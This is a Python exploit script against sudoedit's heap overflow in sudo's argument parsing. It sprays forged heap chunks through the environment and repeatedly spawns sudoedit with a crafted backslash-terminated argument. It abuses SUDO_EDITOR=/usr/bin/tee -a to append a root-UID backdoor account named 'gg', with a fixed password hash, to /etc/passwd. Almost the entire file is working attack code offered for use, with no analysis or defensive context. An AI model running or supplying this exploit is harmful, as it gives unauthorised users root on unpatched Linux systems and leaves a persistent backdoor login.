#!/usr/bin/python
import os
import sys
import resource
from struct import pack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"

PASSWD_PATH = '/etc/passwd'
APPEND_CONTENT = b"gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash\n";


STACK_ADDR_PAGE = 0x7fffe5d35000

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)


def execve(filename, cargv, cenvp):
    libc.execve(filename, cargv, cenvp)


def spawn_raw(filename, cargv, cenvp):
    pid = os.fork()
    if pid:
        _, exit_code = os.waitpid(pid, 0)
        return exit_code
    else:
        execve(filename, cargv, cenvp)
        exit(0)


def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(env))(*env)
    return spawn_raw(filename, cargv, cenvp)


resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

TARGET_CMND_SIZE = 0x1b50

argv = ["sudoedit", "-A", "-s", PASSWD_PATH, "A" * (TARGET_CMND_SIZE - 0x10 - len(PASSWD_PATH) - 1) + "\\", None]

SA = STACK_ADDR_PAGE

ADDR_REFSTR = pack('<Q', SA + 0x20)

ADDR_PRIV_PREV = pack('<Q', SA + 0x10)
ADDR_CMND_PREV = pack('<Q', SA + 0x18)
ADDR_MEMBER_PREV = pack('<Q', SA + 0x20)

ADDR_DEF_VAR = pack('<Q', SA + 0x10)
ADDR_DEF_BINDING = pack('<Q', SA + 0x30)

OFFSET = 0x30 + 0x20
ADDR_USER = pack('<Q', SA + OFFSET)
ADDR_MEMBER = pack('<Q', SA + OFFSET + 0x40)
ADDR_CMND = pack('<Q', SA + OFFSET + 0x40 + 0x30)
ADDR_PRIV = pack('<Q', SA + OFFSET + 0x40 + 0x30 + 0x60)

epage = [
    b'A' * 0x8,  # to not ending with 0x00

    # fake def->var chunk (get freed)
    b'\x21', b'', b'', b'', b'', b'', b'',
    ADDR_PRIV[:6], b'',  # pointer to privilege
    ADDR_CMND[:6], b'',  # pointer to cmndspec
    ADDR_MEMBER[:6], b'',  # pointer to member

    # fake def->binding (list head) (get freed)
    b'\x21', b'', b'', b'', b'', b'', b'',
    b'', b'', b'', b'', b'', b'', b'', b'',  # members.first
    b'A' * 0x10,  # members.last, pad

    # userspec chunk (get freed)
    b'\x41', b'', b'', b'', b'', b'', b'',  # chunk metadata
    b'', b'', b'', b'', b'', b'', b'', b'',  # entries.tqe_next
    b'A' * 8,  # entries.tqe_prev
    b'', b'', b'', b'', b'', b'', b'', b'',  # users.tqh_first
    ADDR_MEMBER[:6], b'',  # users.tqh_last
    b'', b'', b'', b'', b'', b'', b'', b'',  # privileges.tqh_first
    ADDR_PRIV[:6], b'',  # privileges.tqh_last
    b'', b'', b'', b'', b'', b'', b'', b'',  # comments.stqh_first

    # member chunk
    b'\x31', b'', b'', b'', b'', b'', b'',  # chunk size , userspec.comments.stqh_last (can be any)
    b'A' * 8,  # member.tqe_next (can be any), userspec.lineno (can be any)
    ADDR_MEMBER_PREV[:6], b'',  # member.tqe_prev, userspec.file (ref string)
    b'A' * 8,  # member.name (can be any because this object is not freed)
    pack('<H', 284), b'',  # type, negated
    b'A' * 0xc,  # padding

    # cmndspec chunk
    b'\x61' * 0x8,  # chunk metadata (need only prev_inuse flag)
    b'A' * 0x8,  # entries.tqe_next
    ADDR_CMND_PREV[:6], b'',  # entries.teq_prev
    b'', b'', b'', b'', b'', b'', b'', b'',  # runasuserlist
    b'', b'', b'', b'', b'', b'', b'', b'',  # runasgrouplist
    ADDR_MEMBER[:6], b'',  # cmnd
    b'\xf9' + (b'\xff' * 0x17),  # tag (NOPASSWD), timeout, notbefore, notafter
    b'', b'', b'', b'', b'', b'', b'', b'',  # role
    b'', b'', b'', b'', b'', b'', b'', b'',  # type
    b'A' * 8,  # padding

    # privileges chunk
    b'\x51' * 0x8,  # chunk metadata
    b'A' * 0x8,  # entries.tqe_next
    ADDR_PRIV_PREV[:6], b'',  # entries.teq_prev
    b'A' * 8,  # ldap_role
    b'A' * 8,  # hostlist.tqh_first
    ADDR_MEMBER[:6], b'',  # hostlist.teq_last
    b'A' * 8,  # cmndlist.tqh_first
    ADDR_CMND[:6], b'',  # cmndlist.teq_last
]


cnt = sum(map(len, epage))
padlen = 4096 - cnt - len(epage)
epage.append('P' * (padlen - 1))

env = [
    b"A" * (7 + 0x4010 + 0x110) + b"\x21\\",
    b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",

    b"A" * 0x18,

    # defaults
    b"\x41\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # chunk size
    b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # next
    b'a' * 8,  # prev
    ADDR_DEF_VAR[:6] + b'\\', b'\\',  # var
    b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # val
    ADDR_DEF_BINDING[:6] + b'\\', b'\\',  # binding
    ADDR_REFSTR[:6] + b'\\', b'\\',  # file
    b"Z" * 0x8,  # type, op, error, lineno
    b"\x31\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # chunk size (just need valid)
    b'C' * 0x638,  # need prev_inuse and overwrite until userspec
    b'B' * 0x1b0,

    # userspec chunk
    b"\x61\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # chunk size
    ADDR_USER[:6] + b'\\', b'\\',  # entries.tqe_next points to fake userspec in stack
    b"A" * 8,  # entries.tqe_prev
    b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # users.tqh_first
    ADDR_MEMBER[:6] + b'\\', b'\\',  # users.tqh_last
    b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"",  # privileges.tqh_first

    b"LC_ALL=C",
    b"SUDO_EDITOR=/usr/bin/tee -a",
    b"TZ=:",
]



ENV_STACK_SIZE_MB = 4
for i in range(ENV_STACK_SIZE_MB * 1024 // 4):
    env.extend(epage)

# last element. prepare space for '/usr/bin/sudo' and extra 8 bytes
env[-1] = env[-1][:-len(SUDO_PATH) - 1 - 8]

env.append(None)

argv = [a.encode() if isinstance(a, str) else a for a in argv]
env  = [e.encode() if isinstance(e, str) else e for e in env]

cargv = (c_char_p * len(argv))(*argv)
cenvp = (c_char_p * len(env))(*env)


APPEND_CONTENT = bytes(APPEND_CONTENT)  # hasil: b'ABC'

r, w = os.pipe()
os.dup2(r, 0)
w = os.fdopen(w, 'wb')  # binary mode
w.write(APPEND_CONTENT)  # tulis sebagai bytes
w.close()

null_fd = os.open('/dev/null', os.O_RDWR)
os.dup2(null_fd, 2)

for i in range(9999):
    sys.stdout.write('%d\r' % i)
    if i % 8 == 0:
        sys.stdout.flush()
    exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
    if exit_code == 0:
        print("success at %d" % i)
        break
